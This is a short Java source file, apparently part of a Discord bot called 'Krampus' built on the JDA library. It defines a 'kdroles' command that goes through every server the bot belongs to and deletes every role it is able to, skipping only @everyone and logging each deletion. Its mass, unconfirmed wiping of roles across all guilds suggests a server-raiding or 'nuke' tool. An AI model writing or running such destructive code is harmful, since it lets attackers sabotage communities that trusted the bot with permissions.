package dev.krampus.commands.types;

import dev.krampus.KrampusMain;
import dev.krampus.commands.AbstractCommand;
import net.dv8tion.jda.api.entities.Guild;

public class RolesDelete extends AbstractCommand {

    public RolesDelete() {

    }

    @Override
    public String getName() {
        return "kdroles";
    }

    @Override
    public void execute() {
        for (Guild guild : KrampusMain.getJda().getGuilds()) {
            KrampusMain.getJda().getRoles().forEach(role -> {
                if(role == null || role.getName().equalsIgnoreCase("@everyone")){
                    KrampusMain.getConsole().write("\nInvalid role found!");
                    return;
                }
                if (guild.getSelfMember().canInteract(role)) {
                    role.delete().queue();
                    KrampusMain.getConsole().write("\nDeleted role: " + role.getName() + "!");
                } else {
                    KrampusMain.getConsole().write("\nCannot delete role: " + role.getName() + " as it is higher than my highest role!");
                }
            });
        }
    }
}
